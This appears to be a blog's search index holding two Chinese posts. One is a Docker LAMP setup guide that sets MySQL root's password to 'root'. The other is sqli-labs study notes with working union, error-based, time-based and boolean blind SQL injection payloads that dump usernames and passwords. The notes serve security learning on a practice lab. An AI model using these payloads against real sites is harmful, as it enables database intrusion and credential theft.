<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Linux下Docker部署LAMP踩的小坑</title>
    <url>//blogs/docker_LAMP/</url>
    <content><![CDATA[<h2 id="1-环境准备"><a href="#1-环境准备" class="headerlink" title="1.环境准备"></a>1.环境准备</h2><p>安装了Docker的Linux系统</p>
<h2 id="2-获取ubuntu基础镜像"><a href="#2-获取ubuntu基础镜像" class="headerlink" title="2.获取ubuntu基础镜像"></a>2.获取ubuntu基础镜像</h2><p>拉一个18.04版本的ubuntu镜像</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker pull ubuntu:18.04</span><br></pre></td></tr></table></figure>

<p>进入容器</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker run -it ubuntu:18.04 /bin/bash</span><br></pre></td></tr></table></figure>

<p>换源,这里我选择的是阿里云的源,因为镜像中没有安装vim,所以用echo写入内容</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mv /etc/apt/sources.list /etc/apt/sources.list.bak	#备份源文件</span><br><span class="line">echo &quot;deb http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiverse&quot; &gt;/etc/apt/sources.list</span><br><span class="line">echo &quot;deb http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiverse&quot; &gt;&gt;/etc/apt/sources.list</span><br><span class="line">echo &quot;deb http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiverse&quot; &gt;&gt;/etc/apt/sources.list</span><br><span class="line">echo &quot;deb http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiverse&quot; &gt;&gt;/etc/apt/sources.list</span><br><span class="line">echo &quot;deb http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiverse&quot; &gt;&gt;/etc/apt/sources.list</span><br><span class="line">echo &quot;deb-src http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiverse&quot; &gt;&gt;/etc/apt/sources.list</span><br><span class="line">echo &quot;deb-src http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiverse&quot; &gt;&gt;/etc/apt/sources.list</span><br><span class="line">echo &quot;deb-src http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiverse&quot; &gt;&gt;/etc/apt/sources.list</span><br><span class="line">echo &quot;deb-src http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiverse&quot; &gt;&gt;/etc/apt/sources.list</span><br><span class="line">echo &quot;deb-src http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiverse&quot; &gt;&gt;/etc/apt/sources.list</span><br></pre></td></tr></table></figure>

<p>更新源列表</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">apt-get update</span><br></pre></td></tr></table></figure>

<h2 id="3-安装依赖"><a href="#3-安装依赖" class="headerlink" title="3.安装依赖"></a>3.安装依赖</h2><h3 id="3-1-Mysql"><a href="#3-1-Mysql" class="headerlink" title="3.1 Mysql"></a>3.1 Mysql</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">apt-get install mysql-server</span><br></pre></td></tr></table></figure>

<p><strong>坑:</strong></p>
<p>安装完成后启动mysql报错</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ERROR 2002 (HY000): Can&#x27;t connect to local MySQL server through socket &#x27;/var/run/mysqld/mysqld.sock&#x27; (2)</span><br></pre></td></tr></table></figure>

<p><strong>解决方案:</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mkdir -p /var/run/mysqld</span><br><span class="line">chown mysql /var/run/mysqld/</span><br><span class="line">service mysql restart</span><br><span class="line">mysql	//进入mysql</span><br><span class="line">ALTER USER &#x27;root&#x27;@&#x27;localhost&#x27; IDENTIFIED WITH mysql_native_password BY &#x27;root&#x27;; //设置密码</span><br></pre></td></tr></table></figure>

<p>然后进入mysql,即可正常连接</p>
<h3 id="3-2-Apache"><a href="#3-2-Apache" class="headerlink" title="3.2 Apache"></a>3.2 Apache</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">apt-get install apache2</span><br></pre></td></tr></table></figure>

<p><strong>坑</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[Sat Nov 19 06:52:00.409930 2022] [core:warn] [pid 2080] AH00111: Config variable $&#123;APACHE_RUN_DIR&#125; is not defined</span><br><span class="line">apache2: Syntax error on line 80 of /etc/apache2/apache2.conf: DefaultRuntimeDir must be a valid directory, absolute or relative to ServerRoot</span><br></pre></td></tr></table></figure>

<p><strong>解决方案:</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mkdir /var/run/apache2</span><br><span class="line">service apache2 start</span><br></pre></td></tr></table></figure>

<h3 id="3-3-PHP"><a href="#3-3-PHP" class="headerlink" title="3.3 PHP"></a>3.3 PHP</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apt-get install php</span><br><span class="line">apt-get install php-mysql</span><br><span class="line">apt-get install libapache2-mod-php</span><br></pre></td></tr></table></figure>

<p>安装完后查看版本如下,即表示安装成功</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@447e37cf48ee:/etc/apache2/sites-enabled# php -version</span><br><span class="line">PHP 7.2.24-0ubuntu0.18.04.15 (cli) (built: Nov  2 2022 09:09:52) ( NTS )</span><br><span class="line">Copyright (c) 1997-2018 The PHP Group</span><br><span class="line">Zend Engine v3.2.0, Copyright (c) 1998-2018 Zend Technologies</span><br><span class="line">    with Zend OPcache v7.2.24-0ubuntu0.18.04.15, Copyright (c) 1999-2018, by Zend Technologies</span><br></pre></td></tr></table></figure>

<p><strong>坑</strong></p>
<p>在&#x2F;var&#x2F;www&#x2F;html下创建一个phpinfo文件,打开显示空白</p>
<p><strong>解决方案:</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim /etc/php/7.2/apache2/php.ini</span><br></pre></td></tr></table></figure>

<p>首先看下<strong>disable_functions</strong>是否有phpinfo,再将<strong>short_open_tag &#x3D; Off</strong>取消注释并改为<strong>short_open_tag &#x3D; On</strong></p>
<h2 id="4-测试"><a href="#4-测试" class="headerlink" title="4.测试"></a>4.测试</h2><p>此时LAMP环境就搭好了,我们可以在创建一个php文件看是否能解析</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd /var/www/html</span><br><span class="line">vim test.php</span><br></pre></td></tr></table></figure>

<p>文件内容</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">phpinfo</span>();<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/images/Linux%E4%B8%8BDocker%E9%83%A8%E7%BD%B2LAMP%E8%B8%A9%E7%9A%84%E5%B0%8F%E5%9D%91/phpinfo.png" alt="phpinfo"></p>
<p>成功解析</p>
]]></content>
      <tags>
        <tag>Docker</tag>
        <tag>LAMP</tag>
      </tags>
  </entry>
  <entry>
    <title>sqli靶场学习要点总结</title>
    <url>//blogs/sql_injection/</url>
    <content><![CDATA[<h1 id="1-项目准备"><a href="#1-项目准备" class="headerlink" title="1.项目准备"></a>1.项目准备</h1><p><strong>项目地址:</strong> <a href="https://github.com/Audi-1/sqli-labs">https://github.com/Audi-1/sqli-labs</a></p>
<p><strong>环境:</strong> apache php5(支持mysql_connect()) mysql5以上(有information_schema系统表)</p>
<h1 id="2-要点总结"><a href="#2-要点总结" class="headerlink" title="2.要点总结"></a>2.要点总结</h1><h2 id="2-0-前置知识"><a href="#2-0-前置知识" class="headerlink" title="2.0 前置知识"></a>2.0 前置知识</h2><p>MySQL5.0版本以上存在一个重要的系统数据库information_schema,通过此数据库可访问MySQL中存在的数据库名,表明,字段名等元数据</p>
<ul>
<li><strong>infromation_schema.columns:</strong><ul>
<li>table_schema 数据库名</li>
<li>table_name 表名</li>
<li>column_name 列名</li>
</ul>
</li>
<li><strong>information_schema.tables:</strong><ul>
<li>table_schema 数据库名</li>
<li>table_name 表名</li>
</ul>
</li>
<li><strong>information_schema.schemata:</strong><ul>
<li>schema_name 数据库名</li>
</ul>
</li>
</ul>
<h2 id="2-1-常用闭合符号"><a href="#2-1-常用闭合符号" class="headerlink" title="2.1 常用闭合符号"></a>2.1 常用闭合符号</h2><ul>
<li>‘</li>
<li>“</li>
<li>)</li>
<li>‘)</li>
<li>“)</li>
</ul>
<h2 id="2-2-判断注入常用方法"><a href="#2-2-判断注入常用方法" class="headerlink" title="2.2 判断注入常用方法"></a>2.2 判断注入常用方法</h2><ul>
<li>使用闭合符号,让SQL语句不能正常闭合,导致页面报错</li>
<li>构造永真&#x2F;假式,观察返回结果</li>
<li>如果id&#x3D;9-1与id&#x3D;8返回相同,则证明参数值参与了运算,可能存在注入,同理还可利用加、乘、除</li>
</ul>
<h2 id="2-3-注入类型详解"><a href="#2-3-注入类型详解" class="headerlink" title="2.3 注入类型详解"></a>2.3 注入类型详解</h2><p>根据注入技术分类有一下五种:</p>
<ul>
<li>联合查询注入</li>
<li>报错注入</li>
<li>延时注入</li>
<li>布尔盲注</li>
<li>堆叠查询</li>
</ul>
<h3 id="2-3-1-联合查询注入"><a href="#2-3-1-联合查询注入" class="headerlink" title="2.3.1 联合查询注入"></a>2.3.1 联合查询注入</h3><h4 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h4><p>这种注入就是union注入,在MySQL中union为连接两条SQL语句并执行,前提为两边的输入应为相同的列数,如果数据类型不同的话,MySQL会进行隐式转换;同时,列的名称由第一个查询的列的名称决定,所以在进行联合查询前,应提前判断列数,判断列数时,可以使用order by。</p>
<p>在MySQL中,order by代表排序,有如图所示的一张表</p>
<p><img src="/../images/sqli%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%A6%81%E7%82%B9%E6%80%BB%E7%BB%93/image-20221201085050248.png" alt="image-20221201085050248"></p>
<p>可以利用order by 进行排序</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from tb_user order by n;</span><br></pre></td></tr></table></figure>

<p>n可以为数字,也可以为字段,n为数字时,代表表中的第n个字段,即下面两个查询结果一样</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from tb_user order by password;</span><br><span class="line">select * from tb_user order by 3;</span><br></pre></td></tr></table></figure>

<p><img src="/../images/sqli%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%A6%81%E7%82%B9%E6%80%BB%E7%BB%93/image-20221201085417830.png" alt="image-20221201085417830"></p>
<p>如果数字超出字段数,即会报错</p>
<p><img src="/../images/sqli%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%A6%81%E7%82%B9%E6%80%BB%E7%BB%93/image-20221201085617782.png" alt="image-20221201085617782"></p>
<p>我们即可利用这个特征进行字段数的判断,然后用union进行注入</p>
<p>union用法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from table1 union select * from table2;</span><br></pre></td></tr></table></figure>

<p><img src="/../images/sqli%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%A6%81%E7%82%B9%E6%80%BB%E7%BB%93/image-20221201090117321.png" alt="image-20221201090117321"></p>
<p>如果列数不同即会报错</p>
<p><img src="/../images/sqli%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%A6%81%E7%82%B9%E6%80%BB%E7%BB%93/image-20221201090149038.png" alt="image-20221201090149038"></p>
<h4 id="注入方法"><a href="#注入方法" class="headerlink" title="注入方法"></a>注入方法</h4><h5 id="判断注入点"><a href="#判断注入点" class="headerlink" title="判断注入点"></a>判断注入点</h5><p>正常访问</p>
<p><img src="/../images/sqli%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%A6%81%E7%82%B9%E6%80%BB%E7%BB%93/image-20221201090445372.png" alt="image-20221201090445372"></p>
<p>判断是否存在注入,加一个单引号</p>
<p><img src="/../images/sqli%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%A6%81%E7%82%B9%E6%80%BB%E7%BB%93/image-20221201092238575.png" alt="image-20221201092238575"></p>
<p>根据报错信息,可以得到SQL语句直接拼接的参数值,且为单引号闭合</p>
<p>SQL语句大概为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from user where id = &#x27;1&#x27; limit 0,1;</span><br></pre></td></tr></table></figure>



<h5 id="判断查询列数"><a href="#判断查询列数" class="headerlink" title="判断查询列数"></a>判断查询列数</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; order by n --+</span><br></pre></td></tr></table></figure>

<p>当n&#x3D;3时正常,当n&#x3D;4是报错,所以列数为3</p>
<p><img src="/../images/sqli%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%A6%81%E7%82%B9%E6%80%BB%E7%BB%93/image-20221201094042684.png" alt="image-20221201094042684"></p>
<h5 id="判断显示位"><a href="#判断显示位" class="headerlink" title="判断显示位"></a>判断显示位</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; union select 1,2,3 --+</span><br></pre></td></tr></table></figure>

<p><img src="/../images/sqli%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%A6%81%E7%82%B9%E6%80%BB%E7%BB%93/image-20221201094307453.png" alt="image-20221201094307453"></p>
<p>页面没有发生改变,因为这个查询会查询出两行结果,但是这个php文件中只返回一行结果,所以应构造出union左边无结果,可以将id改为-1或者一个极大值,最后url应该为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://192.168.59.137:8715/sqli/Less-1/?id=-1&#x27; union select 1,2,3 --+</span><br></pre></td></tr></table></figure>

<p><img src="/../images/sqli%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%A6%81%E7%82%B9%E6%80%BB%E7%BB%93/image-20221201094710277.png" alt="image-20221201094710277"></p>
<p>2,3即为显示位,可以在2,3的地方替换成我们想要查询的句子,结果会返回到2,3的位置</p>
<h5 id="获取数据库名"><a href="#获取数据库名" class="headerlink" title="获取数据库名"></a>获取数据库名</h5><p>group_concat():函数返回一个字符串结果,该结果由分组中的值连接组合而成</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; union select 1,2,(select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA) --+</span><br></pre></td></tr></table></figure>

<p><img src="/../images/sqli%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%A6%81%E7%82%B9%E6%80%BB%E7%BB%93/image-20221201104649116.png" alt="image-20221201104649116"></p>
<h5 id="获取表名"><a href="#获取表名" class="headerlink" title="获取表名"></a>获取表名</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema=database()) --+</span><br></pre></td></tr></table></figure>

<p><img src="/../images/sqli%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%A6%81%E7%82%B9%E6%80%BB%E7%BB%93/image-20221201104916342.png" alt="image-20221201104916342"></p>
<h5 id="获取列名"><a href="#获取列名" class="headerlink" title="获取列名"></a>获取列名</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; union select 1,2,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;) --+</span><br></pre></td></tr></table></figure>

<p><img src="/../images/sqli%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%A6%81%E7%82%B9%E6%80%BB%E7%BB%93/image-20221201105043018.png" alt="image-20221201105043018"></p>
<h5 id="获取列中的数据"><a href="#获取列中的数据" class="headerlink" title="获取列中的数据"></a>获取列中的数据</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; union select 1,2,(select group_concat(id,&#x27;-&#x27;,username,&#x27;-&#x27;,password) from users) --+</span><br></pre></td></tr></table></figure>

<p><img src="/../images/sqli%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%A6%81%E7%82%B9%E6%80%BB%E7%BB%93/image-20221201105401601.png" alt="image-20221201105401601"></p>
<h3 id="2-3-2-报错注入"><a href="#2-3-2-报错注入" class="headerlink" title="2.3.2 报错注入"></a>2.3.2 报错注入</h3><h4 id="前置知识-1"><a href="#前置知识-1" class="headerlink" title="前置知识"></a>前置知识</h4><p>在MySQL中,报错注入就是指通过页面报出的错误信息,构造合适的语句来获取想要的数据,应用系统没有处理SQL语句错误直接回显到页面上时,即可使用报错注入,报错注入常用的函数是updatexml()</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">updatexml(XML_document,XPath_string,new_value)</span><br></pre></td></tr></table></figure>

<p>XML_document:String格式,为XML文档对象的名称</p>
<p>XPath_string:XPath格式的字符串</p>
<p>new_value:String格式,替换查找到符合条件的数据</p>
<p>报错注入基本语句</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select updatexml(1,concat(0x7e,(select database()),0x7e),1);</span><br></pre></td></tr></table></figure>

<p><strong>0x7e</strong>表示的是~符号,这个符号在XPath语法中是不存在的,因此可以报错,同理,其他在XPath语法中不存在的也可以造成报错,例如!在16进制中为<strong>0x21</strong></p>
<p><img src="/../images/sqli%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%A6%81%E7%82%B9%E6%80%BB%E7%BB%93/image-20221201120119594.png" alt="image-20221201120119594"></p>
<h4 id="注入方法-1"><a href="#注入方法-1" class="headerlink" title="注入方法"></a>注入方法</h4><h5 id="判断注入点-1"><a href="#判断注入点-1" class="headerlink" title="判断注入点"></a>判断注入点</h5><p>加单引号,报错,但是没有显示位,所以可以选择报错注入</p>
<p><img src="/../images/sqli%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%A6%81%E7%82%B9%E6%80%BB%E7%BB%93/image-20221201120756406.png" alt="image-20221201120756406"></p>
<p>SQL语句为:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from user where id = &#x27;1&#x27; limit 0,1;</span><br></pre></td></tr></table></figure>

<h5 id="获取数据库名-1"><a href="#获取数据库名-1" class="headerlink" title="获取数据库名"></a>获取数据库名</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; and updatexml(1,concat(0x7e,(select database()),0x7e),1) --+</span><br></pre></td></tr></table></figure>

<p><img src="/../images/sqli%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%A6%81%E7%82%B9%E6%80%BB%E7%BB%93/image-20221201121516972.png" alt="image-20221201121516972"></p>
<h5 id="获取表名-1"><a href="#获取表名-1" class="headerlink" title="获取表名"></a>获取表名</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1) --+</span><br></pre></td></tr></table></figure>

<p><img src="/../images/sqli%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%A6%81%E7%82%B9%E6%80%BB%E7%BB%93/image-20221201121706270.png" alt="image-20221201121706270"></p>
<h5 id="获取列名-1"><a href="#获取列名-1" class="headerlink" title="获取列名"></a>获取列名</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;),0x7e),1) --+</span><br></pre></td></tr></table></figure>

<p><img src="/../images/sqli%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%A6%81%E7%82%B9%E6%80%BB%E7%BB%93/image-20221201121850810.png" alt="image-20221201121850810"></p>
<h5 id="获取列中的数据-1"><a href="#获取列中的数据-1" class="headerlink" title="获取列中的数据"></a>获取列中的数据</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; and updatexml(1,concat(0x7e,(select group_concat(id,&#x27;-&#x27;,username,&#x27;-&#x27;,password) from users),0x7e),1) --+</span><br></pre></td></tr></table></figure>

<p><img src="/../images/sqli%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%A6%81%E7%82%B9%E6%80%BB%E7%BB%93/image-20221201122637232.png" alt="image-20221201122637232"></p>
<p>此时数据并没有完全爆出,因为一次只能爆出32个字符,这里字符大于32,需要使用到substring()函数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">substring(string,position,length)</span><br></pre></td></tr></table></figure>

<p>string:指需要截取的原字符串</p>
<p>position:指从哪个位置开始截取字符串,从1开始,为负数时从右往左数</p>
<p>length:指需要截取的长度</p>
<p>所以我们的句子可以改成这样</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; and updatexml(1,concat(0x7e,substring((select group_concat(id,&#x27;-&#x27;,username,&#x27;-&#x27;,password) from users),1,32),0x7e),1) --+</span><br></pre></td></tr></table></figure>

<p>可以通过修改position的值得到全部数据</p>
<h3 id="2-3-3-延时注入"><a href="#2-3-3-延时注入" class="headerlink" title="2.3.3 延时注入"></a>2.3.3 延时注入</h3><h4 id="前置知识-2"><a href="#前置知识-2" class="headerlink" title="前置知识"></a>前置知识</h4><p>延时注入是在我们构造语句之后,通过页面的响应时间来判断正确的数据,当页面无回显时,可以构造延时语句进行注入</p>
<p>延时主要用的函数为<strong>if()<strong>和</strong>sleep()</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(expr1,expr2,expr3)</span><br></pre></td></tr></table></figure>

<p>如果expr1的值为TRUE,则if的返回值为expr2,否则为expr3</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select if(1=1,999,666)</span><br></pre></td></tr></table></figure>

<p><img src="/../images/sqli%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%A6%81%E7%82%B9%E6%80%BB%E7%BB%93/image-20221201124213175.png" alt="image-20221201124213175"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sleep(n)</span><br></pre></td></tr></table></figure>

<p>n表示延迟的秒数</p>
<p><img src="/../images/sqli%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%A6%81%E7%82%B9%E6%80%BB%E7%BB%93/image-20221201124337650.png" alt="image-20221201124337650"></p>
<h4 id="注入方法-2"><a href="#注入方法-2" class="headerlink" title="注入方法"></a>注入方法</h4><h5 id="判断注入点-2"><a href="#判断注入点-2" class="headerlink" title="判断注入点"></a>判断注入点</h5><p>加单引号,页面无变化,使用延时函数成功延时</p>
<p><img src="/../images/sqli%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%A6%81%E7%82%B9%E6%80%BB%E7%BB%93/image-20221201124943294.png" alt="image-20221201124943294"></p>
<p>SQL语句为:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from user where id = &#x27;1&#x27; limit 0,1;</span><br></pre></td></tr></table></figure>

<h5 id="判断数据库长度"><a href="#判断数据库长度" class="headerlink" title="判断数据库长度"></a>判断数据库长度</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; and if((length(database())=1),sleep(2),1) --+</span><br></pre></td></tr></table></figure>

<p>如果数据库的长度为1,则会延时两秒,可以通过页面返回的延时时间获取到正确的数据库长度</p>
<p>当判断到数据库长度为8时,响应延时了2秒,证明数据库长度为8</p>
<p><img src="/../images/sqli%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%A6%81%E7%82%B9%E6%80%BB%E7%BB%93/image-20221201130219446.png" alt="image-20221201130219446"></p>
<h5 id="获取数据库名-2"><a href="#获取数据库名-2" class="headerlink" title="获取数据库名"></a>获取数据库名</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; and if(ascii(substring(database(),1,1))=1,sleep(2),1) --+</span><br></pre></td></tr></table></figure>

<p>数据库名由26个字母(区分大小写)和0-9个自然数加上下划线组成,相应的ascii码值为48-57、65-90、97-122、95,可以通过页面的响应时间判断数据库的第一个字符的ascii码值,再参照ascii码对照表得到数据库名的第一个字符,剩下的字符同理</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; and if(ascii(substring(database(),1,1))=115,sleep(2),1) --+</span><br></pre></td></tr></table></figure>

<p>延时2秒,证明ascii码值为115,对应的字符为s,则数据库第一个字符为s</p>
<p><img src="/../images/sqli%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%A6%81%E7%82%B9%E6%80%BB%E7%BB%93/image-20221201131654510.png" alt="image-20221201131654510"></p>
<h5 id="获取表名-2"><a href="#获取表名-2" class="headerlink" title="获取表名"></a>获取表名</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; and if(ascii(substring((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=1,sleep(2),1) --+</span><br></pre></td></tr></table></figure>

<p>通过遍历数字,遍历到101时,延时2秒,第一个表的表名第一个字符的ascii码值为101,即为e</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; and if(ascii(substring((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=101,sleep(2),1) --+</span><br></pre></td></tr></table></figure>

<p><img src="/../images/sqli%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%A6%81%E7%82%B9%E6%80%BB%E7%BB%93/image-20221201132325990.png" alt="image-20221201132325990"></p>
<h5 id="获取列名-2"><a href="#获取列名-2" class="headerlink" title="获取列名"></a>获取列名</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; and if(ascii(substring((select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 0,1),1,1))=1,sleep(2),1)--+</span><br></pre></td></tr></table></figure>

<p>通过遍历数字,遍历到85时,延时2秒,第一个列的列名第一个字符的ascii码值为85,即为U</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; and if(ascii(substring((select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 0,1),1,1))=85,sleep(2),1)--+</span><br></pre></td></tr></table></figure>

<p><img src="/../images/sqli%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%A6%81%E7%82%B9%E6%80%BB%E7%BB%93/image-20221201133754247.png" alt="image-20221201133754247"></p>
<h5 id="获取列中的数据-2"><a href="#获取列中的数据-2" class="headerlink" title="获取列中的数据"></a>获取列中的数据</h5><p>获取到的列名为USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS,id,username,password</p>
<p>现在获取username中的值</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; and if(ascii(substring((select username from users limit 0,1),1,1))=1,sleep(2),1)--+</span><br></pre></td></tr></table></figure>

<p>通过遍历数字,遍历到68时,延时2秒,第一个列的列名第一个字符的ascii码值为68,即为D</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; and if(ascii(substring((select username from users limit 0,1),1,1))=68,sleep(2),1)--+</span><br></pre></td></tr></table></figure>

<p><img src="/../images/sqli%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%A6%81%E7%82%B9%E6%80%BB%E7%BB%93/image-20221201135543278.png" alt="image-20221201135543278"></p>
<h3 id="2-3-4-布尔盲注"><a href="#2-3-4-布尔盲注" class="headerlink" title="2.3.4 布尔盲注"></a>2.3.4 布尔盲注</h3><h4 id="前置知识-3"><a href="#前置知识-3" class="headerlink" title="前置知识"></a>前置知识</h4><p>布尔(boolean)型是在计算机中的一种数据类型,只有True(真)和False(假)两个值,一般也称为逻辑性,当页面回显存在真和假两种情况时,可以使用布尔盲注</p>
<p><strong>和延时注入的区别:</strong></p>
<p>页面无任何变化的注入点,只能通过时间来判断是否执行了SQL语句的情况下使用延时注入,存在真假两种情况的注入点可以使用布尔盲注,效率比延时注入更高</p>
<h4 id="注入方法-3"><a href="#注入方法-3" class="headerlink" title="注入方法"></a>注入方法</h4><h5 id="判断注入点-3"><a href="#判断注入点-3" class="headerlink" title="判断注入点"></a>判断注入点</h5><p>加单引号,无报错信息,无数据,使用布尔盲注</p>
<p><img src="/../images/sqli%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%A6%81%E7%82%B9%E6%80%BB%E7%BB%93/image-20221201145511630.png" alt="image-20221201145511630"></p>
<h5 id="判断数据库长度-1"><a href="#判断数据库长度-1" class="headerlink" title="判断数据库长度"></a>判断数据库长度</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; and length(database())=8 --+</span><br></pre></td></tr></table></figure>

<p>通过遍历数字,遍历到8时,返回正常界面,即数据库长度为8</p>
<p><img src="/../images/sqli%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%A6%81%E7%82%B9%E6%80%BB%E7%BB%93/image-20221201151409609.png" alt="image-20221201151409609"></p>
<h5 id="获取数据库名-3"><a href="#获取数据库名-3" class="headerlink" title="获取数据库名"></a>获取数据库名</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; and ascii(substring(database(),1,1))=115 --+</span><br></pre></td></tr></table></figure>

<p>通过遍历数字,遍历到115时,返回正常界面,即数据库第一个字母的ascii码值为115,即为s</p>
<p><img src="/../images/sqli%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%A6%81%E7%82%B9%E6%80%BB%E7%BB%93/image-20221201151820419.png" alt="image-20221201151820419"></p>
